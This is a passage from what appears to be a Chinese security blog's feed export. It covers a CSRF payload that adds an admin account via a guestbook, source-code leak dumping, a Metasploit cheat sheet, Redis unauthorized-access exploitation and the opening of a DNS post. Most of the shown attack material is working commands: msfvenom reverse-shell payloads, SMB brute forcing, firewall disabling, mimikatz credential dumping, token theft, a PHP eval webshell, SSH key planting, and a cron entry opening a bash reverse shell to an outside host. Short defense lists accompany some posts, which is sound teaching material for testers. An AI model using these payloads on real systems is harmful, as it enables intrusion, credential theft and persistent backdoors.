<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var xmlhttp;</span><br><span class="line">if(window.XMLHttpRequest)&#123;</span><br><span class="line">  xmlhttp=new XMLHttpRequest();</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">  xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;/admin/admin_manage.asp?act=add&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;admin=789&amp;password=789&amp;password3=789&amp;button=提交数据&quot;);</span><br></pre></td></tr></table></figure>
<p>在xss平台上配置项目<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/CSRF17.jpg" alt=""></p>
<p>然后插入测试网站的留言板里<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/CSRF18.jpg" alt=""></p>
<p>管理员查看留言信息就能添加一个管理员账号了<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/CSRF19.jpg" alt=""><br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/CSRF20.jpg" alt=""></p>
<h2><span id="csrf-漏洞防护">CSRF 漏洞防护</span></h2><p>其实现在有关CSRF漏洞防护已经是比较成熟了，其主要防护的思路就是需要在进行后台数据修改操作的过程中，添加对当前用户身份的有效验证措施，而不能仅限于cookie的识别，这里简单的罗列了下防护措施如下。</p>
<p>（1） 来源校验</p>
<p>使用http请求头中referer来源，对客户端源进行身份校验，此方法早期使用比较多，但是仍然容易被绕过，所以这里并不建议使用。</p>
<p>（2） 用户token 校验</p>
<p>添加基于当前用户身份的有效tokens随机验证机制，即在向后端提交数据操作请求时，添加基于当前用户的随机token校验值，此种校验方法当前使用比较多；</p>
<p>（3）当前用户密码验证</p>
<p>在修改关键信息时，要钱当前用户输入其自身的密码，以验证当前用户身份的真伪，防止未授权的恶意操作；</p>
<p>（4）添加验证机制</p>
<p>在请求数据的提交前，需填写验证码信息提交，以增加对用户来源的有效验证，防止恶意未授权的操作产生。</p>
<p>参考链接：<br><a href="http://www.test404.com/post-1410.html" target="_blank" rel="noopener">http://www.test404.com/post-1410.html</a><br><a href="http://www.freebuf.com/articles/web/55965.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/55965.html</a></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[常见Web源码泄露总结]]></title>
      <url>https://uknowsec.cn/posts/ctf/%E5%B8%B8%E8%A7%81Web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="背景">背景</span></h2><p>本文主要是记录一下常见的源码泄漏问题，这些经常在web渗透测试以及CTF中出现。</p>
<h2><span id="源码泄漏分类">源码泄漏分类</span></h2><h3><span id="hg源码泄漏">.hg源码泄漏</span></h3><h4><span id="漏洞成因">漏洞成因：</span></h4><p>hg init的时候会生成.hg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e.g.http://www.example.com/.hg/</span><br></pre></td></tr></table></figure></p>
<h4><span id="漏洞利用">漏洞利用：</span></h4><p>工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-hg.pl -v -u http://www.example.com/.hg/</span><br></pre></td></tr></table></figure></p>
<h3><span id="git源码泄漏">.git源码泄漏</span></h3><h4><span id="漏洞成因">漏洞成因：</span></h4><p>在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e.g. http://www.example.com/.git/config</span><br></pre></td></tr></table></figure></p>
<h4><span id="漏洞利用">漏洞利用：</span></h4><p>工具：</p>
<p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GitHack.py http://www.example.com/.git/</span><br></pre></td></tr></table></figure></p>
<p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-git.pl -v -u http://www.example.com/.git/</span><br></pre></td></tr></table></figure></p>
<h3><span id="ds_store文件泄漏">.DS_Store文件泄漏</span></h3><h4><span id="漏洞成因">漏洞成因:</span></h4><p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p>
<h4><span id="漏洞利用">漏洞利用:</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/.ds_store</span><br></pre></td></tr></table></figure>
<p>注意路径检查</p>
<p>工具：</p>
<p><a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">dsstoreexp</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ds_store_exp.py http://www.example.com/.DS_Store</span><br></pre></td></tr></table></figure></p>
<h3><span id="网站备份压缩文件">网站备份压缩文件</span></h3><p>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p>
<h4><span id="漏洞成因及危害">漏洞成因及危害:</span></h4><p>该漏洞的成因主要有以下两种：</p>
<p>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。<br>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</p>
<h4><span id="漏洞检测">漏洞检测:</span></h4><p>该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.rar</span><br><span class="line">.zip</span><br><span class="line">.7z</span><br><span class="line">.tar.gz</span><br><span class="line">.bak</span><br><span class="line">.swp</span><br><span class="line">.txt</span><br><span class="line">.html</span><br></pre></td></tr></table></figure></p>
<h3><span id="svn导致文件泄露">SVN导致文件泄露</span></h3><p>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。</p>
<p>Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e.g.http://vote.lz.taobao.com/admin/scripts/fckeditor.266/editor/.svn/entries</span><br></pre></td></tr></table></figure>
<h4><span id="漏洞利用">漏洞利用:</span></h4><p>工具：</p>
<p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-svn.pl -v -u http://www.example.com/.svn/</span><br></pre></td></tr></table></figure>
<p>Seay-Svn</p>
<h3><span id="web-infwebxml泄露">WEB-INF/web.xml泄露</span></h3><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
<p>WEB-INF主要包含一下文件或目录：</p>
<ul>
<li>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li>
<li>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</li>
<li>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li>
<li>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</li>
<li>/WEB-INF/database.properties：数据库配置文件<h4><span id="漏洞成因">漏洞成因：</span></h4></li>
</ul>
<p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p>
<p>漏洞检测以及利用方法：</p>
<p>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。<br>一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p>
<h3><span id="cvs泄漏">CVS泄漏</span></h3><h4><span id="漏洞利用">漏洞利用</span></h4><p>测试的目录</p>
<ul>
<li><a href="http://url/CVS/Root" target="_blank" rel="noopener">http://url/CVS/Root</a> 返回根信息</li>
<li><a href="http://url/CVS/Entries" target="_blank" rel="noopener">http://url/CVS/Entries</a> 返回所有文件的结构<br>取回源码的命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk clone http://url/name dir</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</p>
<p>查看所有的改变的命令，转到download的目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bk changes</span><br><span class="line">Bazaar/bzr</span><br></pre></td></tr></table></figure></p>
<p>工具：</p>
<p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-bzr.pl -v -u http://www.example.com/.bzr/</span><br></pre></td></tr></table></figure></p>
<p>工具推荐</p>
<p>Bitkeeper<br>weakfilescan</p>
<h2><span id="参考">参考</span></h2><p><a href="https://zhuanlan.zhihu.com/p/21296806" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/21296806</a><br><a href="http://www.s2.sshz.org/post/source-code-leak/" target="_blank" rel="noopener">http://www.s2.sshz.org/post/source-code-leak/</a></p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Metasploit Framework 利用总结]]></title>
      <url>https://uknowsec.cn/posts/skill/Meatsploit-Framework-%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="msfvenom-payload-list">msfvenom Payload List</span></h2><h3><span id="linux">Linux</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
<h3><span id="windows">Windows</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
<h3><span id="mac">Mac</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>
<h3><span id="php">PHP</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;\n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>
<h3><span id="asp">ASP</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>
<h3><span id="jsp">JSP</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>
<h3><span id="war">WAR</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>
<h3><span id="python">Python</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>
<h3><span id="bash">Bash</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>
<h3><span id="perl">Perl</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>
<h2><span id="handlers">Handlers</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD &lt;Payload name&gt;</span><br><span class="line">set LHOST &lt;LHOST value&gt;</span><br><span class="line">set LPORT &lt;LPORT value&gt;</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure>
<h2><span id="扫描端口">扫描端口</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">show options</span><br><span class="line">set LHOST &lt;LHOST value&gt;</span><br><span class="line">set LPORTS &lt;LPORT value&gt;</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/msfvemon2.jpg" alt=""></p>
<h2><span id="windows-smb模块">Windows Smb模块</span></h2><h3><span id="扫描smb判断主机">扫描smb判断主机</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">show options</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/msfvemon3.jpg" alt=""></p>
<h3><span id="爆破smb密码">爆破smb密码</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_login</span><br><span class="line">set SMBUser administrator</span><br><span class="line">set PASS_FILE /tmp/pass</span><br><span class="line">set RHOSTS 192.168.1.116</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/msfvemon4.jpg" alt=""></p>
<h3><span id="开启3389远程桌面">开启3389远程桌面</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure>
<h3><span id="关闭防火墙">关闭防火墙</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">netsh adcfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
<h3><span id="实时截图">实时截图</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">screenshot</span><br><span class="line">use espia</span><br></pre></td></tr></table></figure>
<h3><span id="meterpreter加载mimikatz抓取明文密码">meterpreter加载mimikatz抓取明文密码</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;load mimikatz</span><br><span class="line">msv</span><br><span class="line">kerberos</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/msfvemon1.jpg" alt=""></p>
<h3><span id="窃取及伪造域账户-token">窃取及伪造域账户 token</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token xxxxx\\xxxxxxx</span><br><span class="line">execute -f cmd.exe -i -t</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/msfvemon6.jpg" alt=""></p>
]]></content>
      
        <categories>
            
            <category> 技巧 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[配置漏洞之redis未授权访问]]></title>
      <url>https://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8Bredis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="环境安装">环境安装</span></h2><h3><span id="下载源码">下载源码</span></h3><p>解压缩后编译源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ wget http://download.redis.io/releases/redis-2.8.3.tar.gz</span><br><span class="line">$ tar xzf redis-2.8.3.tar.gz</span><br><span class="line">$ cd redis-2.8.3</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure></p>
<h3><span id="编译完成后">编译完成后</span></h3><p>在Src目录下，有四个可执行文件redis-server、redis-benchmark、redis-cli和redis.conf。然后拷贝到一个目录下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir /usr/redis</span><br><span class="line">cp redis-server  /usr/redis</span><br><span class="line">cp redis-benchmark /usr/redis</span><br><span class="line">cp redis-cli  /usr/redis</span><br><span class="line">cp redis.conf  /usr/redis</span><br><span class="line">cd /usr/redis</span><br></pre></td></tr></table></figure>
<h3><span id="启动redis服务">启动redis服务</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-server ./redis.conf</span><br></pre></td></tr></table></figure>
<h3><span id="查看redis是否开启">查看redis是否开启</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ntlp | grep redis</span><br></pre></td></tr></table></figure>
<h2><span id="漏洞利用">漏洞利用</span></h2><ul>
<li>保存到www目录，创建webshell</li>
<li>创建SSH authorized_keys文件</li>
<li>写计划任务（/var/spool/cron/&amp;/etc/cron.d/）</li>
<li>slave of 8.8.8.8主从模式利用</li>
<li>写入到/etc/profile.d/用户环境变量</li>
<li>开启AOF持久化纯文本记录appendfilename</li>
</ul>
<h3><span id="利用nmap获取redis信息">利用nmap获取redis信息</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p6379 --script=redis-info 192.168.132.134</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/redis1.jpg" alt=""></p>
<h3><span id="利用redis客户端进行未授权访问">利用redis客户端进行未授权访问</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h 192.168.132.134</span><br><span class="line">192.168.132.134:6379&gt; info</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/redis2.jpg" alt=""></p>
<p>当然，如果redis存在访问密码的话，可以使用如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h 192.168.132.134 –a [password]</span><br></pre></td></tr></table></figure></p>
<h3><span id="利用redis连接写入ssh公钥">利用redis连接写入ssh公钥</span></h3><h4><span id="在攻击机上生成ssh公钥和私钥">在攻击机上生成ssh公钥和私钥</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/redis3.jpg" alt=""></p>
<h4><span id="将公钥写入文本">将公钥写入文本</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.ssh/</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;)&gt; 1.txt</span><br></pre></td></tr></table></figure>
<h4><span id="将1txt写入redis">将1.txt写入redis</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 1.txt | /usr/local/redis/./redis-cli -h 192.168.132.134 -x set crack</span><br></pre></td></tr></table></figure>
<h4><span id="利用redis客户端连接靶机redis">利用redis客户端连接靶机redis</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h 192.168.132.134</span><br></pre></td></tr></table></figure>
<h4><span id="获取redis备份的路径">获取redis备份的路径</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.132.134:6379&gt; CONFIG GET dir</span><br></pre></td></tr></table></figure>
<h4><span id="更改redis备份路径">更改redis备份路径</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.132.134:6379&gt; CONFIG SET dir /root/.ssh</span><br></pre></td></tr></table></figure>
<h4><span id="设置备份文件的名称为authorized_keys">设置备份文件的名称为authorized_keys</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.132.134:6379&gt; CONFIG SET dbfilename authorized_keys</span><br></pre></td></tr></table></figure>
<h4><span id="检查是否更改">检查是否更改</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.132.134:6379&gt; CONFIG GET dbfilename</span><br></pre></td></tr></table></figure>
<h4><span id="保存">保存</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.132.134:6379&gt; save</span><br></pre></td></tr></table></figure>
<h4><span id="ssh连接">ssh连接</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh –i  id_rsa root@192.168.1.11</span><br></pre></td></tr></table></figure>
<h3><span id="利用redis写入shell">利用redis写入Shell</span></h3><h4><span id="查看是否存在web服务">查看是否存在web服务</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.111</span><br></pre></td></tr></table></figure>
<h4><span id="确定web服务目录">确定web服务目录</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /usr/local/apache/htdocs/</span><br><span class="line">config set dbfilename ok.php </span><br><span class="line">set test &quot;&lt;?php @eval($_POST[123]);?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<h4><span id="菜刀连接一句话木马">菜刀连接一句话木马</span></h4><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/redis-cli0.png" alt=""></p>
<h3><span id="写计划任务来反弹shell">写计划任务来反弹shell</span></h3><h4><span id="telnet登录也可以redis-cli登录">telnet登录/也可以redis-cli登录</span></h4><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/redis-cli1.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.236.130 6379 //未授权登录</span><br><span class="line"></span><br><span class="line">config set dir /var/spool/cron/ //配置文件夹的路径（CONFIG SET 命令可以动态地调整 Redis 服务器的配置而(configuration)而无须重启。）//每个用户生成的crontab文件，都会放在 /var/spool/cron/ 目录下面</span><br><span class="line"></span><br><span class="line">set -.- &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.236.129/9999 0&gt;&amp;1\n\n\n&quot; //直接往当前用户的crontab里写入反弹shell，换行是必不可少的。</span><br></pre></td></tr></table></figure>
<h4><span id="nc反弹">nc反弹</span></h4><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/redis-cli2.png" alt=""></p>
<h2><span id="漏洞修复">漏洞修复</span></h2><ul>
<li>禁止使用 root 权限启动 redis 服务；</li>
<li>对 redis 访问启用密码认证，并且添加 IP 访问限制；</li>
<li>尽可能不对公网直接开放 SSH 服务。</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 技巧 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[配置漏洞之DNS域传送信息泄露]]></title>
      <url>https://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8BDNS%E5%9F%9F%E4%BC%A0%E9%80%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
